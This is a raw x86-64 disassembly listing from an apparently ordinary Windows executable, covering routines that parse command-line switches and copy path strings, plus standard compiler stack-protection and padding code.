   140007428:	75 94                	jne    0x1400073be
   14000742a:	49 3b cd             	cmp    %r13,%rcx
   14000742d:	0f 83 18 05 00 00    	jae    0x14000794b
   140007433:	44 88 7c 0c 40       	mov    %r15b,0x40(%rsp,%rcx,1)
   140007438:	45 85 c0             	test   %r8d,%r8d
   14000743b:	74 60                	je     0x14000749d
   14000743d:	45 85 c9             	test   %r9d,%r9d
   140007440:	75 60                	jne    0x1400074a2
   140007442:	41 8b f7             	mov    %r15d,%esi
   140007445:	44 39 3d c0 58 00 00 	cmp    %r15d,0x58c0(%rip)        # 0x14000cd0c
   14000744c:	0f 84 c4 04 00 00    	je     0x140007916
   140007452:	44 38 3d c5 59 00 00 	cmp    %r15b,0x59c5(%rip)        # 0x14000ce1e
   140007459:	0f 85 b7 04 00 00    	jne    0x140007916
   14000745f:	48 8b 0d 0a 6a 00 00 	mov    0x6a0a(%rip),%rcx        # 0x14000de70
   140007466:	48 8d 1d b1 59 00 00 	lea    0x59b1(%rip),%rbx        # 0x14000ce1e
   14000746d:	48 8b d3             	mov    %rbx,%rdx
   140007470:	45 8b c5             	mov    %r13d,%r8d
   140007473:	48 ff 15 96 1f 00 00 	rex.W call *0x1f96(%rip)        # 0x140009410
   14000747a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000747f:	85 c0                	test   %eax,%eax
   140007481:	0f 84 8c 04 00 00    	je     0x140007913
   140007487:	ba 5c 00 00 00       	mov    $0x5c,%edx
   14000748c:	48 8b cb             	mov    %rbx,%rcx
   14000748f:	e8 24 0b 00 00       	call   0x140007fb8
   140007494:	44 88 78 01          	mov    %r15b,0x1(%rax)
   140007498:	e9 79 04 00 00       	jmp    0x140007916
   14000749d:	45 85 c9             	test   %r9d,%r9d
   1400074a0:	75 a0                	jne    0x140007442
   1400074a2:	8a 44 24 40          	mov    0x40(%rsp),%al
   1400074a6:	2c 2d                	sub    $0x2d,%al
   1400074a8:	a8 fd                	test   $0xfd,%al
   1400074aa:	0f 85 2e 03 00 00    	jne    0x1400077de
   1400074b0:	48 0f be 4c 24 41    	movsbq 0x41(%rsp),%rcx
   1400074b6:	48 ff 15 c3 20 00 00 	rex.W call *0x20c3(%rip)        # 0x140009580
   1400074bd:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400074c2:	0f be c8             	movsbl %al,%ecx
   1400074c5:	83 e9 3f             	sub    $0x3f,%ecx
   1400074c8:	0f 84 19 04 00 00    	je     0x1400078e7
   1400074ce:	83 e9 04             	sub    $0x4,%ecx
   1400074d1:	0f 84 0e 03 00 00    	je     0x1400077e5
   1400074d7:	41 2b cc             	sub    %r12d,%ecx
   1400074da:	0f 84 db 01 00 00    	je     0x1400076bb
   1400074e0:	83 e9 0a             	sub    $0xa,%ecx
   1400074e3:	0f 84 5c 01 00 00    	je     0x140007645
   1400074e9:	83 e9 03             	sub    $0x3,%ecx
   1400074ec:	0f 84 07 01 00 00    	je     0x1400075f9
   1400074f2:	41 2b cc             	sub    %r12d,%ecx
   1400074f5:	74 19                	je     0x140007510
   1400074f7:	3b cf                	cmp    %edi,%ecx
   1400074f9:	0f 84 bc 01 00 00    	je     0x1400076bb
   1400074ff:	41 8b f7             	mov    %r15d,%esi
   140007502:	45 38 3e             	cmp    %r15b,(%r14)
   140007505:	0f 84 3a ff ff ff    	je     0x140007445
   14000750b:	e9 6e fe ff ff       	jmp    0x14000737e
   140007510:	8a 44 24 42          	mov    0x42(%rsp),%al
   140007514:	84 c0                	test   %al,%al
   140007516:	75 13                	jne    0x14000752b
   140007518:	c7 05 3a 69 00 00 03 	movl   $0x3,0x693a(%rip)        # 0x14000de5c
   14000751f:	00 00 00 
   140007522:	44 89 25 df 57 00 00 	mov    %r12d,0x57df(%rip)        # 0x14000cd08
   140007529:	eb d7                	jmp    0x140007502
   14000752b:	3c 3a                	cmp    $0x3a,%al
   14000752d:	0f 85 8b 00 00 00    	jne    0x1400075be
   140007533:	48 8b 44 24 43       	mov    0x43(%rsp),%rax
   140007538:	44 89 25 1d 69 00 00 	mov    %r12d,0x691d(%rip)        # 0x14000de5c
   14000753f:	84 c0                	test   %al,%al
   140007541:	74 bf                	je     0x140007502
   140007543:	48 8d 5c 24 43       	lea    0x43(%rsp),%rbx
   140007548:	48 0f be c8          	movsbq %al,%rcx
   14000754c:	48 ff 15 2d 20 00 00 	rex.W call *0x202d(%rip)        # 0x140009580
   140007553:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007558:	49 03 dc             	add    %r12,%rbx
   14000755b:	3c 41                	cmp    $0x41,%al
   14000755d:	74 47                	je     0x1400075a6
   14000755f:	3c 44                	cmp    $0x44,%al
   140007561:	74 3a                	je     0x14000759d
   140007563:	3c 49                	cmp    $0x49,%al
   140007565:	74 2d                	je     0x140007594
   140007567:	3c 4e                	cmp    $0x4e,%al
   140007569:	74 20                	je     0x14000758b
   14000756b:	3c 50                	cmp    $0x50,%al
   14000756d:	74 12                	je     0x140007581
   14000756f:	3c 53                	cmp    $0x53,%al
   140007571:	74 05                	je     0x140007578
   140007573:	41 8b f7             	mov    %r15d,%esi
   140007576:	eb 3b                	jmp    0x1400075b3
   140007578:	83 0d dd 68 00 00 04 	orl    $0x4,0x68dd(%rip)        # 0x14000de5c
   14000757f:	eb 2b                	jmp    0x1400075ac
   140007581:	0f ba 2d 9f 5a 00 00 	btsl   $0x7,0x5a9f(%rip)        # 0x14000d028
   140007588:	07 
   140007589:	eb 28                	jmp    0x1400075b3
   14000758b:	83 25 ca 68 00 00 fe 	andl   $0xfffffffe,0x68ca(%rip)        # 0x14000de5c
   140007592:	eb 18                	jmp    0x1400075ac
   140007594:	83 25 c1 68 00 00 fd 	andl   $0xfffffffd,0x68c1(%rip)        # 0x14000de5c
   14000759b:	eb 0f                	jmp    0x1400075ac
   14000759d:	83 0d 84 5a 00 00 40 	orl    $0x40,0x5a84(%rip)        # 0x14000d028
   1400075a4:	eb 0d                	jmp    0x1400075b3
   1400075a6:	09 3d b0 68 00 00    	or     %edi,0x68b0(%rip)        # 0x14000de5c
   1400075ac:	44 89 25 55 57 00 00 	mov    %r12d,0x5755(%rip)        # 0x14000cd08
   1400075b3:	8a 03                	mov    (%rbx),%al
   1400075b5:	84 c0                	test   %al,%al
   1400075b7:	75 8f                	jne    0x140007548
   1400075b9:	e9 44 ff ff ff       	jmp    0x140007502
   1400075be:	83 4c 24 28 ff       	orl    $0xffffffff,0x28(%rsp)
   1400075c3:	48 8d 44 24 41       	lea    0x41(%rsp),%rax
   1400075c8:	41 83 c9 ff          	or     $0xffffffff,%r9d
   1400075cc:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400075d1:	4c 8d 05 48 24 00 00 	lea    0x2448(%rip),%r8        # 0x140009a20
   1400075d8:	41 8b d4             	mov    %r12d,%edx
   1400075db:	b9 7f 00 00 00       	mov    $0x7f,%ecx
   1400075e0:	48 ff 15 31 1c 00 00 	rex.W call *0x1c31(%rip)        # 0x140009218
   1400075e7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400075ec:	3b c7                	cmp    %edi,%eax
   1400075ee:	0f 84 0e ff ff ff    	je     0x140007502
   1400075f4:	e9 06 ff ff ff       	jmp    0x1400074ff
   1400075f9:	8a 44 24 42          	mov    0x42(%rsp),%al
   1400075fd:	84 c0                	test   %al,%al
   1400075ff:	75 0c                	jne    0x14000760d
   140007601:	66 89 3d 10 57 00 00 	mov    %di,0x5710(%rip)        # 0x14000cd18
   140007608:	e9 f5 fe ff ff       	jmp    0x140007502
   14000760d:	3c 3a                	cmp    $0x3a,%al
   14000760f:	0f 85 ea fe ff ff    	jne    0x1400074ff
   140007615:	48 0f be 4c 24 43    	movsbq 0x43(%rsp),%rcx
   14000761b:	48 ff 15 5e 1f 00 00 	rex.W call *0x1f5e(%rip)        # 0x140009580
   140007622:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007627:	3c 31                	cmp    $0x31,%al
   140007629:	74 d6                	je     0x140007601
   14000762b:	3c 41                	cmp    $0x41,%al
   14000762d:	74 09                	je     0x140007638
   14000762f:	3c 55                	cmp    $0x55,%al
   140007631:	74 ce                	je     0x140007601
   140007633:	e9 c7 fe ff ff       	jmp    0x1400074ff
   140007638:	66 44 89 25 d8 56 00 	mov    %r12w,0x56d8(%rip)        # 0x14000cd18
   14000763f:	00 
   140007640:	e9 bd fe ff ff       	jmp    0x140007502
   140007645:	8a 44 24 42          	mov    0x42(%rsp),%al
   140007649:	84 c0                	test   %al,%al
   14000764b:	75 0c                	jne    0x140007659
   14000764d:	44 89 25 b8 56 00 00 	mov    %r12d,0x56b8(%rip)        # 0x14000cd0c
   140007654:	e9 a9 fe ff ff       	jmp    0x140007502
   140007659:	3c 3a                	cmp    $0x3a,%al
   14000765b:	0f 85 9e fe ff ff    	jne    0x1400074ff
   140007661:	48 8b 44 24 43       	mov    0x43(%rsp),%rax
   140007666:	84 c0                	test   %al,%al
   140007668:	0f 84 94 fe ff ff    	je     0x140007502
   14000766e:	48 8d 5c 24 43       	lea    0x43(%rsp),%rbx
   140007673:	48 0f be c8          	movsbq %al,%rcx
   140007677:	48 ff 15 02 1f 00 00 	rex.W call *0x1f02(%rip)        # 0x140009580
   14000767e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007683:	49 03 dc             	add    %r12,%rbx
   140007686:	3c 45                	cmp    $0x45,%al
   140007688:	74 1f                	je     0x1400076a9
   14000768a:	3c 47                	cmp    $0x47,%al
   14000768c:	74 12                	je     0x1400076a0
   14000768e:	3c 56                	cmp    $0x56,%al
   140007690:	74 05                	je     0x140007697
   140007692:	41 8b f7             	mov    %r15d,%esi
   140007695:	eb 19                	jmp    0x1400076b0
   140007697:	44 89 25 76 56 00 00 	mov    %r12d,0x5676(%rip)        # 0x14000cd14
   14000769e:	eb 10                	jmp    0x1400076b0
   1400076a0:	44 89 25 69 56 00 00 	mov    %r12d,0x5669(%rip)        # 0x14000cd10
   1400076a7:	eb 07                	jmp    0x1400076b0
   1400076a9:	44 89 25 5c 56 00 00 	mov    %r12d,0x565c(%rip)        # 0x14000cd0c
   1400076b0:	8a 03                	mov    (%rbx),%al
   1400076b2:	84 c0                	test   %al,%al
   1400076b4:	75 bd                	jne    0x140007673
   1400076b6:	e9 47 fe ff ff       	jmp    0x140007502
   1400076bb:	80 7c 24 42 3a       	cmpb   $0x3a,0x42(%rsp)
   1400076c0:	0f 85 39 fe ff ff    	jne    0x1400074ff
   1400076c6:	48 8b 44 24 43       	mov    0x43(%rsp),%rax
   1400076cb:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400076d0:	2c 22                	sub    $0x22,%al
   1400076d2:	f6 d8                	neg    %al
   1400076d4:	1b db                	sbb    %ebx,%ebx
   1400076d6:	83 c3 04             	add    $0x4,%ebx
   1400076d9:	8b c3                	mov    %ebx,%eax
   1400076db:	48 03 c8             	add    %rax,%rcx
   1400076de:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400076e2:	48 ff c0             	inc    %rax
   1400076e5:	44 38 3c 01          	cmp    %r15b,(%rcx,%rax,1)
   1400076e9:	75 f7                	jne    0x1400076e2
   1400076eb:	48 85 c0             	test   %rax,%rax
   1400076ee:	0f 84 0b fe ff ff    	je     0x1400074ff
   1400076f4:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400076f9:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   1400076fd:	e8 9a fb ff ff       	call   0x14000729c
   140007702:	85 c0                	test   %eax,%eax
   140007704:	0f 84 f5 fd ff ff    	je     0x1400074ff
   14000770a:	48 0f be 4c 24 41    	movsbq 0x41(%rsp),%rcx
   140007710:	48 ff 15 69 1e 00 00 	rex.W call *0x1e69(%rip)        # 0x140009580
   140007717:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000771c:	4d 8b c5             	mov    %r13,%r8
   14000771f:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007724:	3c 54                	cmp    $0x54,%al
   140007726:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000772a:	75 33                	jne    0x14000775f
   14000772c:	03 c3                	add    %ebx,%eax
   14000772e:	4c 8d 0d e9 56 00 00 	lea    0x56e9(%rip),%r9        # 0x14000ce1e
   140007735:	48 98                	cltq
   140007737:	49 8b d1             	mov    %r9,%rdx
   14000773a:	49 2b c1             	sub    %r9,%rax
   14000773d:	48 03 c8             	add    %rax,%rcx
   140007740:	49 8d 80 fa fe ff 7f 	lea    0x7ffffefa(%r8),%rax
   140007747:	48 85 c0             	test   %rax,%rax
   14000774a:	74 44                	je     0x140007790
   14000774c:	8a 04 11             	mov    (%rcx,%rdx,1),%al
   14000774f:	84 c0                	test   %al,%al
   140007751:	74 3d                	je     0x140007790
   140007753:	88 02                	mov    %al,(%rdx)
   140007755:	49 03 d4             	add    %r12,%rdx
   140007758:	4d 2b c4             	sub    %r12,%r8
   14000775b:	75 e3                	jne    0x140007740
   14000775d:	eb 31                	jmp    0x140007790
   14000775f:	03 c3                	add    %ebx,%eax
   140007761:	4c 8d 0d b2 55 00 00 	lea    0x55b2(%rip),%r9        # 0x14000cd1a
   140007768:	48 98                	cltq
   14000776a:	49 8b d1             	mov    %r9,%rdx
   14000776d:	49 2b c1             	sub    %r9,%rax
   140007770:	48 03 c8             	add    %rax,%rcx
   140007773:	49 8d 80 fa fe ff 7f 	lea    0x7ffffefa(%r8),%rax
   14000777a:	48 85 c0             	test   %rax,%rax
   14000777d:	74 11                	je     0x140007790
   14000777f:	8a 04 11             	mov    (%rcx,%rdx,1),%al
   140007782:	84 c0                	test   %al,%al
   140007784:	74 0a                	je     0x140007790
   140007786:	88 02                	mov    %al,(%rdx)
   140007788:	49 03 d4             	add    %r12,%rdx
   14000778b:	4d 2b c4             	sub    %r12,%r8
   14000778e:	75 e3                	jne    0x140007773
   140007790:	4d 85 c0             	test   %r8,%r8
   140007793:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   140007797:	49 8b d9             	mov    %r9,%rbx
   14000779a:	4c 8d 05 bf 1f 00 00 	lea    0x1fbf(%rip),%r8        # 0x140009760
   1400077a1:	48 0f 45 c2          	cmovne %rdx,%rax
   1400077a5:	48 8b cb             	mov    %rbx,%rcx
   1400077a8:	41 8b d5             	mov    %r13d,%edx
   1400077ab:	44 88 38             	mov    %r15b,(%rax)
   1400077ae:	e8 55 06 00 00       	call   0x140007e08
   1400077b3:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400077b7:	48 ff c0             	inc    %rax
   1400077ba:	44 38 3c 03          	cmp    %r15b,(%rbx,%rax,1)
   1400077be:	75 f7                	jne    0x1400077b7
   1400077c0:	48 83 f8 03          	cmp    $0x3,%rax
   1400077c4:	72 18                	jb     0x1400077de
   1400077c6:	8a 43 01             	mov    0x1(%rbx),%al
   1400077c9:	3c 3a                	cmp    $0x3a,%al
   1400077cb:	0f 84 31 fd ff ff    	je     0x140007502
   1400077d1:	80 3b 5c             	cmpb   $0x5c,(%rbx)
   1400077d4:	75 08                	jne    0x1400077de
   1400077d6:	3c 5c                	cmp    $0x5c,%al
   1400077d8:	0f 84 24 fd ff ff    	je     0x140007502
   1400077de:	33 c0                	xor    %eax,%eax
   1400077e0:	e9 38 01 00 00       	jmp    0x14000791d
   1400077e5:	8a 44 24 42          	mov    0x42(%rsp),%al
   1400077e9:	84 c0                	test   %al,%al
   1400077eb:	75 0c                	jne    0x1400077f9
   1400077ed:	44 89 25 10 55 00 00 	mov    %r12d,0x5510(%rip)        # 0x14000cd04
   1400077f4:	e9 09 fd ff ff       	jmp    0x140007502
   1400077f9:	3c 3a                	cmp    $0x3a,%al
   1400077fb:	0f 85 fe fc ff ff    	jne    0x1400074ff
   140007801:	48 8b 44 24 43       	mov    0x43(%rsp),%rax
   140007806:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   14000780b:	2c 22                	sub    $0x22,%al
   14000780d:	f6 d8                	neg    %al
   14000780f:	1b ff                	sbb    %edi,%edi
   140007811:	83 c7 04             	add    $0x4,%edi
   140007814:	8b c7                	mov    %edi,%eax
   140007816:	48 03 d8             	add    %rax,%rbx
   140007819:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000781d:	48 ff c0             	inc    %rax
   140007820:	44 38 3c 03          	cmp    %r15b,(%rbx,%rax,1)
   140007824:	75 f7                	jne    0x14000781d
   140007826:	48 85 c0             	test   %rax,%rax
   140007829:	75 0a                	jne    0x140007835
   14000782b:	bf 02 00 00 00       	mov    $0x2,%edi
   140007830:	e9 ca fc ff ff       	jmp    0x1400074ff
   140007835:	ba 5b 00 00 00       	mov    $0x5b,%edx
   14000783a:	48 8b cb             	mov    %rbx,%rcx
   14000783d:	e8 06 07 00 00       	call   0x140007f48
   140007842:	48 85 c0             	test   %rax,%rax
   140007845:	74 12                	je     0x140007859
   140007847:	ba 5d 00 00 00       	mov    $0x5d,%edx
   14000784c:	48 8b cb             	mov    %rbx,%rcx
   14000784f:	e8 f4 06 00 00       	call   0x140007f48
   140007854:	48 85 c0             	test   %rax,%rax
   140007857:	74 d2                	je     0x14000782b
   140007859:	ba 5d 00 00 00       	mov    $0x5d,%edx
   14000785e:	48 8b cb             	mov    %rbx,%rcx
   140007861:	e8 e2 06 00 00       	call   0x140007f48
   140007866:	48 85 c0             	test   %rax,%rax
   140007869:	74 12                	je     0x14000787d
   14000786b:	ba 5b 00 00 00       	mov    $0x5b,%edx
   140007870:	48 8b cb             	mov    %rbx,%rcx
   140007873:	e8 d0 06 00 00       	call   0x140007f48
   140007878:	48 85 c0             	test   %rax,%rax
   14000787b:	74 ae                	je     0x14000782b
   14000787d:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140007882:	89 7c 24 30          	mov    %edi,0x30(%rsp)
   140007886:	48 8b cb             	mov    %rbx,%rcx
   140007889:	e8 0e fa ff ff       	call   0x14000729c
   14000788e:	85 c0                	test   %eax,%eax
   140007890:	74 99                	je     0x14000782b
   140007892:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140007896:	4c 8d 0d 85 56 00 00 	lea    0x5685(%rip),%r9        # 0x14000cf22
   14000789d:	03 c7                	add    %edi,%eax
   14000789f:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400078a4:	48 98                	cltq
   1400078a6:	4d 8b c5             	mov    %r13,%r8
   1400078a9:	49 2b c1             	sub    %r9,%rax
   1400078ac:	49 8b d1             	mov    %r9,%rdx
   1400078af:	48 03 c8             	add    %rax,%rcx
   1400078b2:	49 8d 80 fa fe ff 7f 	lea    0x7ffffefa(%r8),%rax
   1400078b9:	48 85 c0             	test   %rax,%rax
   1400078bc:	74 11                	je     0x1400078cf
   1400078be:	8a 04 11             	mov    (%rcx,%rdx,1),%al
   1400078c1:	84 c0                	test   %al,%al
   1400078c3:	74 0a                	je     0x1400078cf
   1400078c5:	88 02                	mov    %al,(%rdx)
   1400078c7:	49 03 d4             	add    %r12,%rdx
   1400078ca:	4d 2b c4             	sub    %r12,%r8
   1400078cd:	75 e3                	jne    0x1400078b2
   1400078cf:	4d 85 c0             	test   %r8,%r8
   1400078d2:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   1400078d6:	bf 02 00 00 00       	mov    $0x2,%edi
   1400078db:	48 0f 45 c2          	cmovne %rdx,%rax
   1400078df:	44 88 38             	mov    %r15b,(%rax)
   1400078e2:	e9 1b fc ff ff       	jmp    0x140007502
   1400078e7:	e8 d4 a2 ff ff       	call   0x140001bc0
   1400078ec:	48 8b 0d 3d 4f 00 00 	mov    0x4f3d(%rip),%rcx        # 0x14000c830
   1400078f3:	48 85 c9             	test   %rcx,%rcx
   1400078f6:	74 0c                	je     0x140007904
   1400078f8:	48 ff 15 59 19 00 00 	rex.W call *0x1959(%rip)        # 0x140009258
   1400078ff:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007904:	33 c9                	xor    %ecx,%ecx
   140007906:	48 ff 15 93 1a 00 00 	rex.W call *0x1a93(%rip)        # 0x1400093a0
   14000790d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007912:	cc                   	int3
   140007913:	41 8b f7             	mov    %r15d,%esi
   140007916:	8b c6                	mov    %esi,%eax
   140007918:	eb 03                	jmp    0x14000791d
   14000791a:	41 8b c4             	mov    %r12d,%eax
   14000791d:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140007921:	48 33 cc             	xor    %rsp,%rcx
   140007924:	e8 c7 0d 00 00       	call   0x1400086f0
   140007929:	4c 8d 9c 24 60 01 00 	lea    0x160(%rsp),%r11
   140007930:	00 
   140007931:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   140007935:	49 8b 73 40          	mov    0x40(%r11),%rsi
   140007939:	49 8b 7b 48          	mov    0x48(%r11),%rdi
   14000793d:	49 8b e3             	mov    %r11,%rsp
   140007940:	41 5f                	pop    %r15
   140007942:	41 5e                	pop    %r14
   140007944:	41 5d                	pop    %r13
   140007946:	41 5c                	pop    %r12
   140007948:	5d                   	pop    %rbp
   140007949:	c3                   	ret
   14000794a:	cc                   	int3
   14000794b:	e8 78 0f 00 00       	call   0x1400088c8
   140007950:	cc                   	int3
   140007951:	cc                   	int3
   140007952:	cc                   	int3
   140007953:	cc                   	int3
   140007954:	cc                   	int3
   140007955:	cc                   	int3
   140007956:	cc                   	int3
   140007957:	cc                   	int3
   140007958:	48 83 ec 28          	sub    $0x28,%rsp
   14000795c:	48 ff 15 bd 18 00 00 	rex.W call *0x18bd(%rip)        # 0x140009220
   140007963:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007968:	8b c8                	mov    %eax,%ecx
   14000796a:	0f b7 c0             	movzwl %ax,%eax
   14000796d:	0d 00 00 07 80       	or     $0x80070000,%eax
   140007972:	85 c9                	test   %ecx,%ecx
   140007974:	0f 4e c1             	cmovle %ecx,%eax
   140007977:	48 83 c4 28          	add    $0x28,%rsp
   14000797b:	c3                   	ret
   14000797c:	cc                   	int3
   14000797d:	cc                   	int3
   14000797e:	cc                   	int3
   14000797f:	cc                   	int3
   140007980:	cc                   	int3
   140007981:	cc                   	int3
   140007982:	cc                   	int3
   140007983:	cc                   	int3
   140007984:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140007989:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000798e:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140007993:	57                   	push   %rdi
   140007994:	48 83 ec 50          	sub    $0x50,%rsp
   140007998:	48 8b 05 69 46 00 00 	mov    0x4669(%rip),%rax        # 0x14000c008
   14000799f:	48 33 c4             	xor    %rsp,%rax
   1400079a2:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400079a7:	33 f6                	xor    %esi,%esi
   1400079a9:	48 8b e9             	mov    %rcx,%rbp
   1400079ac:	45 33 c9             	xor    %r9d,%r9d
   1400079af:	bf 01 00 00 00       	mov    $0x1,%edi
   1400079b4:	eb 75                	jmp    0x140007a2b
   1400079b6:	48 8b d0             	mov    %rax,%rdx
   1400079b9:	33 c9                	xor    %ecx,%ecx
   1400079bb:	48 ff 15 d6 19 00 00 	rex.W call *0x19d6(%rip)        # 0x140009398
   1400079c2:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400079c7:	48 8b c8             	mov    %rax,%rcx
   1400079ca:	48 ff 15 a7 19 00 00 	rex.W call *0x19a7(%rip)        # 0x140009378
   1400079d1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400079d6:	48 8b d8             	mov    %rax,%rbx
   1400079d9:	48 85 c0             	test   %rax,%rax
   1400079dc:	0f 84 93 00 00 00    	je     0x140007a75
   1400079e2:	4c 8d 40 08          	lea    0x8(%rax),%r8
   1400079e6:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400079ea:	48 ff c0             	inc    %rax
   1400079ed:	41 80 3c 00 00       	cmpb   $0x0,(%r8,%rax,1)
   1400079f2:	75 f6                	jne    0x1400079ea
   1400079f4:	4c 8d 48 01          	lea    0x1(%rax),%r9
   1400079f8:	4d 03 c8             	add    %r8,%r9
   1400079fb:	49 ba 70 ab de 38 30 	movabs $0x9cd83f3038deab70,%r10
   140007a02:	3f d8 9c 
   140007a05:	8b 53 04             	mov    0x4(%rbx),%edx
   140007a08:	48 8b c5             	mov    %rbp,%rax
   140007a0b:	8b 0b                	mov    (%rbx),%ecx
   140007a0d:	ff 15 6d 1c 00 00    	call   *0x1c6d(%rip)        # 0x140009680
   140007a13:	48 8b cb             	mov    %rbx,%rcx
   140007a16:	85 c0                	test   %eax,%eax
   140007a18:	74 4b                	je     0x140007a65
   140007a1a:	48 ff 15 0f 19 00 00 	rex.W call *0x190f(%rip)        # 0x140009330
   140007a21:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007a26:	03 f7                	add    %edi,%esi
   140007a28:	44 8b ce             	mov    %esi,%r9d
   140007a2b:	4c 8d 05 fe 1f 00 00 	lea    0x1ffe(%rip),%r8        # 0x140009a30
   140007a32:	ba 14 00 00 00       	mov    $0x14,%edx
   140007a37:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140007a3c:	e8 7b 96 ff ff       	call   0x1400010bc
   140007a41:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   140007a47:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140007a4c:	33 c9                	xor    %ecx,%ecx
   140007a4e:	48 ff 15 b3 18 00 00 	rex.W call *0x18b3(%rip)        # 0x140009308
   140007a55:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007a5a:	48 85 c0             	test   %rax,%rax
   140007a5d:	0f 85 53 ff ff ff    	jne    0x1400079b6
   140007a63:	eb 1c                	jmp    0x140007a81
   140007a65:	33 ff                	xor    %edi,%edi
   140007a67:	48 ff 15 c2 18 00 00 	rex.W call *0x18c2(%rip)        # 0x140009330
   140007a6e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007a73:	eb 0c                	jmp    0x140007a81
   140007a75:	c7 05 c5 5a 00 00 14 	movl   $0x80070714,0x5ac5(%rip)        # 0x14000d544
   140007a7c:	07 07 80 
   140007a7f:	33 ff                	xor    %edi,%edi
   140007a81:	8b c7                	mov    %edi,%eax
   140007a83:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140007a88:	48 33 cc             	xor    %rsp,%rcx
   140007a8b:	e8 60 0c 00 00       	call   0x1400086f0
   140007a90:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   140007a95:	48 8b 6c 24 70       	mov    0x70(%rsp),%rbp
   140007a9a:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   140007a9f:	48 83 c4 50          	add    $0x50,%rsp
   140007aa3:	5f                   	pop    %rdi
   140007aa4:	c3                   	ret
   140007aa5:	cc                   	int3
   140007aa6:	cc                   	int3
   140007aa7:	cc                   	int3
   140007aa8:	71 ab                	jno    0x140007a55
   140007aaa:	de 38                	fidivrs (%rax)
   140007aac:	30 3f                	xor    %bh,(%rdi)
   140007aae:	d8 9c 48 89 5c 24 08 	fcomps 0x8245c89(%rax,%rcx,2)
   140007ab5:	44 8b d9             	mov    %ecx,%r11d
   140007ab8:	4c 8d 15 01 52 00 00 	lea    0x5201(%rip),%r10        # 0x14000ccc0
   140007abf:	41 b9 00 02 00 00    	mov    $0x200,%r9d
   140007ac5:	bb 08 00 00 00       	mov    $0x8,%ebx
   140007aca:	33 d2                	xor    %edx,%edx
   140007acc:	41 8b c3             	mov    %r11d,%eax
   140007acf:	41 f7 f1             	div    %r9d
   140007ad2:	44 8b c2             	mov    %edx,%r8d
   140007ad5:	41 f7 d8             	neg    %r8d
   140007ad8:	1b c9                	sbb    %ecx,%ecx
   140007ada:	41 23 c9             	and    %r9d,%ecx
   140007add:	45 03 c9             	add    %r9d,%r9d
   140007ae0:	2b ca                	sub    %edx,%ecx
   140007ae2:	41 03 cb             	add    %r11d,%ecx
   140007ae5:	41 01 0a             	add    %ecx,(%r10)
   140007ae8:	4d 8d 52 04          	lea    0x4(%r10),%r10
   140007aec:	48 83 eb 01          	sub    $0x1,%rbx
   140007af0:	75 d8                	jne    0x140007aca
   140007af2:	8d 43 01             	lea    0x1(%rbx),%eax
   140007af5:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   140007afa:	c3                   	ret
   140007afb:	cc                   	int3
   140007afc:	cc                   	int3
   140007afd:	cc                   	int3
   140007afe:	cc                   	int3
   140007aff:	cc                   	int3
   140007b00:	cc                   	int3
   140007b01:	cc                   	int3
   140007b02:	cc                   	int3
   140007b03:	cc                   	int3
   140007b04:	cc                   	int3
   140007b05:	cc                   	int3
   140007b06:	cc                   	int3
   140007b07:	cc                   	int3
   140007b08:	71 ab                	jno    0x140007ab5
   140007b0a:	de 38                	fidivrs (%rax)
   140007b0c:	30 3f                	xor    %bh,(%rdi)
   140007b0e:	d8 9c 48 89 5c 24 10 	fcomps 0x10245c89(%rax,%rcx,2)
   140007b15:	55                   	push   %rbp
   140007b16:	56                   	push   %rsi
   140007b17:	57                   	push   %rdi
   140007b18:	48 81 ec 70 01 00 00 	sub    $0x170,%rsp
   140007b1f:	48 8b 05 e2 44 00 00 	mov    0x44e2(%rip),%rax        # 0x14000c008
   140007b26:	48 33 c4             	xor    %rsp,%rax
   140007b29:	48 89 84 24 60 01 00 	mov    %rax,0x160(%rsp)
   140007b30:	00 
   140007b31:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   140007b36:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140007b3b:	8b f1                	mov    %ecx,%esi
